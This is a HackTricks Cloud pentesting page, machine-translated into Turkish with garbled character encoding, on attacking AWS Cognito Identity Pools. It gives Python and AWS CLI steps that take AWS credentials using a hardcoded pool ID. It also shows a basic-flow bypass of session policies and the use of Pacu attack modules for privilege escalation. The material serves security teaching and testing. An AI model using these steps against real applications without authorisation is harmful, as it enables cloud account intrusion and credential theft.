# Cognito Identity Pools

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Kimlik havuzlarÄ±, kullanÄ±cÄ±larÄ±nÄ±zÄ±n **geÃ§ici kimlik bilgileri edinmesini** saÄŸlayarak kritik bir rol oynar. Bu kimlik bilgileri, Amazon S3 ve DynamoDB dahil olmak Ã¼zere Ã§eÅŸitli AWS hizmetlerine eriÅŸim iÃ§in gereklidir. Kimlik havuzlarÄ±nÄ±n dikkat Ã§ekici bir Ã¶zelliÄŸi, hem anonim misafir kullanÄ±cÄ±larÄ± hem de kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in bir dizi kimlik saÄŸlayÄ±cÄ±sÄ±nÄ± desteklemeleridir. Desteklenen kimlik saÄŸlayÄ±cÄ±larÄ± ÅŸunlardÄ±r:

* Amazon Cognito kullanÄ±cÄ± havuzlarÄ±
* Facebook, Google, Amazon ile GiriÅŸ ve Apple ile GiriÅŸ gibi sosyal oturum aÃ§ma seÃ§enekleri
* OpenID Connect (OIDC) ile uyumlu saÄŸlayÄ±cÄ±lar
* SAML (GÃ¼venlik BeyanÄ± Ä°ÅŸaretleme Dili) kimlik saÄŸlayÄ±cÄ±larÄ±
* GeliÅŸtirici kimlik doÄŸrulamalÄ± kimlikler
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Kimlik Havuzu oturumlarÄ± oluÅŸturmak iÃ§in Ã¶nce **bir Kimlik ID'si oluÅŸturmanÄ±z** gerekir. Bu Kimlik ID'si, **o kullanÄ±cÄ±nÄ±n oturumunun tanÄ±mlayÄ±cÄ±sÄ±dÄ±r**. Bu tanÄ±mlayÄ±cÄ±lar, 1MB'a kadar anahtar-deÄŸer Ã§iftleri depolayabilen 20'ye kadar veri kÃ¼mesine sahip olabilir.

Bu, **bir kullanÄ±cÄ±nÄ±n bilgilerini saklamak iÃ§in faydalÄ±dÄ±r** (her zaman aynÄ± Kimlik ID'sini kullanacak olan).

AyrÄ±ca, **cognito-sync** hizmeti, **bu bilgileri yÃ¶netmek ve senkronize etmek iÃ§in** hizmettir (veri kÃ¼melerinde, akÄ±ÅŸlarda ve SNS mesajlarÄ±nda bilgi gÃ¶ndererek...).

### Tools for pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS istismar Ã§erÃ§evesi, artÄ±k bir hesapta tÃ¼m Cognito varlÄ±klarÄ±nÄ±n sayÄ±mÄ±nÄ± otomatikleÅŸtiren ve zayÄ±f yapÄ±landÄ±rmalarÄ±, eriÅŸim kontrolÃ¼ iÃ§in kullanÄ±lan kullanÄ±cÄ± niteliklerini vb. iÅŸaret eden "cognito\_\_enum" ve "cognito\_\_attack" modÃ¼llerini iÃ§ermektedir. AyrÄ±ca, kullanÄ±cÄ± oluÅŸturmayÄ± (MFA desteÄŸi dahil) ve deÄŸiÅŸtirilebilir Ã¶zel niteliklere, kullanÄ±labilir kimlik havuzu kimlik bilgilerine, id token'larÄ±ndaki Ã¼stlenilebilir rollere dayalÄ± ayrÄ±calÄ±k yÃ¼kseltmeyi otomatikleÅŸtirir.

ModÃ¼llerin iÅŸlevlerinin aÃ§Ä±klamasÄ± iÃ§in [blog yazÄ±sÄ±nÄ±n](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) 2. kÄ±smÄ±na bakÄ±n. Kurulum talimatlarÄ± iÃ§in ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasÄ±na bakÄ±n.

#### Usage

Belirli bir kimlik havuzu ve kullanÄ±cÄ± havuzu istemcisi karÅŸÄ±sÄ±nda kullanÄ±cÄ± oluÅŸturma ve tÃ¼m ayrÄ±calÄ±k yÃ¼kseltme vektÃ¶rlerini denemek iÃ§in Ã¶rnek cognito\_\_attack kullanÄ±mÄ±:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Ã–rnek cognito\_\_enum kullanÄ±mÄ±, mevcut AWS hesabÄ±nda gÃ¶rÃ¼nen tÃ¼m kullanÄ±cÄ± havuzlarÄ±nÄ±, kullanÄ±cÄ± havuzu istemcilerini, kimlik havuzlarÄ±nÄ±, kullanÄ±cÄ±larÄ± vb. toplamak iÃ§in:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) is a CLI aracÄ±dÄ±r python'da, istenmeyen hesap oluÅŸturma ve kimlik havuzu yÃ¼kseltme dahil olmak Ã¼zere Cognito'ya farklÄ± saldÄ±rÄ±lar uygular.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### KullanÄ±m
```bash
$ cognito-scanner --help
```
Daha fazla bilgi iÃ§in https://github.com/padok-team/cognito-scanner adresini kontrol edin

## IAM Rollere EriÅŸim

### Kimlik DoÄŸrulamasÄ± Olmadan

Bir saldÄ±rganÄ±n, kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ bir kullanÄ±cÄ± olarak bir Cognito uygulamasÄ±nda **AWS kimlik bilgilerini almak** iÃ§in bilmesi gereken tek ÅŸey **Kimlik Havuzu ID'sidir** ve bu **ID, web/mobil uygulamada** kullanÄ±lmasÄ± iÃ§in sabit kodlanmÄ±ÅŸ olmalÄ±dÄ±r. Bir ID ÅŸu ÅŸekilde gÃ¶rÃ¼nÃ¼r: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (bruteforce edilemez).

{% hint style="success" %}
OluÅŸturulan **IAM Cognito kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ rolÃ¼ varsayÄ±lan olarak** `Cognito_<Kimlik Havuzu adÄ±>Unauth_Role` olarak adlandÄ±rÄ±lÄ±r.
{% endhint %}

EÄŸer sabit kodlanmÄ±ÅŸ bir Kimlik Havuzu ID'si bulursanÄ±z ve bu kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lara izin veriyorsa, AWS kimlik bilgilerini ÅŸu ÅŸekilde alabilirsiniz:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ya da aÅŸaÄŸÄ±daki **aws cli komutlarÄ±nÄ±** kullanabilirsiniz:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Not edin ki, varsayÄ±lan olarak kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ bir cognito **kullanÄ±cÄ±sÄ±nÄ±n hiÃ§bir izni olamaz, hatta bir politika aracÄ±lÄ±ÄŸÄ±yla atanmÄ±ÅŸ olsa bile**. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mÃ¼ kontrol edin.
{% endhint %}

### GeliÅŸmiÅŸ vs Temel Kimlik DoÄŸrulama AkÄ±ÅŸÄ±

Ã–nceki bÃ¶lÃ¼m **varsayÄ±lan geliÅŸmiÅŸ kimlik doÄŸrulama akÄ±ÅŸÄ±nÄ±** takip etti. Bu akÄ±ÅŸ, oluÅŸturulan IAM rol oturumu iÃ§in **kÄ±sÄ±tlayÄ±cÄ±** [**oturum politikasÄ±**](../../aws-basic-information/#session-policies) belirler. Bu politika, oturumun [**bu listedeki hizmetleri kullanmasÄ±na**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) izin verecektir (rolÃ¼n diÄŸer hizmetlere eriÅŸimi olsa bile).

Ancak, bunu aÅŸmanÄ±n bir yolu vardÄ±r; eÄŸer **Kimlik havuzunda "Temel (Klasik) AkÄ±ÅŸ" etkinse**, kullanÄ±cÄ± o akÄ±ÅŸÄ± kullanarak bir oturum alabilecektir ve bu **kÄ±sÄ±tlayÄ±cÄ± oturum politikasÄ±** olmayacaktÄ±r.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
EÄŸer bu **hata** ile karÅŸÄ±laÅŸÄ±rsanÄ±z, bunun nedeni **temel akÄ±ÅŸÄ±n etkin olmamasÄ±dÄ±r (varsayÄ±lan)**

`GetOpenIdToken iÅŸlemi sÄ±rasÄ±nda bir hata oluÅŸtu (InvalidParameterException): Temel (klasik) akÄ±ÅŸ etkin deÄŸil, lÃ¼tfen geliÅŸtirilmiÅŸ akÄ±ÅŸÄ± kullanÄ±n.`
{% endhint %}

Bir dizi IAM kimlik bilgisine sahip olduÄŸunuzda, [hangi eriÅŸime sahip olduÄŸunuzu kontrol etmelisiniz](../../#whoami) ve [yetkileri yÃ¼kseltmeye Ã§alÄ±ÅŸmalÄ±sÄ±nÄ±z](../../aws-privilege-escalation/).

### Kimlik DoÄŸrulanmÄ±ÅŸ

{% hint style="info" %}
**Kimlik doÄŸrulanmÄ±ÅŸ kullanÄ±cÄ±larÄ±n** muhtemelen **farklÄ± izinler** alacaÄŸÄ±nÄ± unutmayÄ±n, bu nedenle eÄŸer **uygulama iÃ§inde kaydolabiliyorsanÄ±z**, bunu yapmayÄ± deneyin ve yeni kimlik bilgilerini alÄ±n.
{% endhint %}

**Kimlik Havuzuna** eriÅŸen **kimlik doÄŸrulanmÄ±ÅŸ kullanÄ±cÄ±lar** iÃ§in de **roller** mevcut olabilir.

Bunun iÃ§in **kimlik saÄŸlayÄ±cÄ±sÄ±na** eriÅŸiminiz olmasÄ± gerekebilir. EÄŸer bu bir **Cognito KullanÄ±cÄ± Havuzu** ise, belki varsayÄ±lan davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanarak **kendiniz yeni bir kullanÄ±cÄ± oluÅŸturabilirsiniz**.

{% hint style="success" %}
**IAM Cognito kimlik doÄŸrulama rolÃ¼ varsayÄ±lan olarak** `Cognito_<Kimlik Havuzu adÄ±>Auth_Role` olarak adlandÄ±rÄ±lÄ±r.
{% endhint %}

Her neyse, **aÅŸaÄŸÄ±daki Ã¶rnek**, bir **Cognito KullanÄ±cÄ± Havuzu** iÃ§inde oturum aÃ§mÄ±ÅŸ olduÄŸunuzu varsayÄ±yor (diÄŸer tÃ¼rde kimlik saÄŸlayÄ±cÄ±larÄ±nÄ±n da yapÄ±landÄ±rÄ±labileceÄŸini unutmayÄ±n).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Ã–nceki komut yanÄ±tÄ±ndan identity_id'yi alÄ±n
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# IdToken iÃ§inde bir kullanÄ±cÄ±nÄ±n eriÅŸim saÄŸladÄ±ÄŸÄ± rolleri bulabilirsiniz Ã§Ã¼nkÃ¼ KullanÄ±cÄ± Havuzu GruplarÄ± nedeniyle
# Belirli bir role kimlik bilgilerini almak iÃ§in --custom-role-arn kullanÄ±n
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
KullanÄ±cÄ±nÄ±n oturum aÃ§tÄ±ÄŸÄ± kimlik saÄŸlayÄ±cÄ±sÄ±na veya hatta **kullanÄ±cÄ±ya** (iddialar kullanarak) baÄŸlÄ± olarak **farklÄ± IAM rollerini yapÄ±landÄ±rmak mÃ¼mkÃ¼ndÃ¼r**. Bu nedenle, aynÄ± veya farklÄ± saÄŸlayÄ±cÄ±lar aracÄ±lÄ±ÄŸÄ±yla farklÄ± kullanÄ±cÄ±lara eriÅŸiminiz varsa, **oturum aÃ§mak ve hepsinin IAM rollerine eriÅŸmek** faydalÄ± olabilir.
{% endhint %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
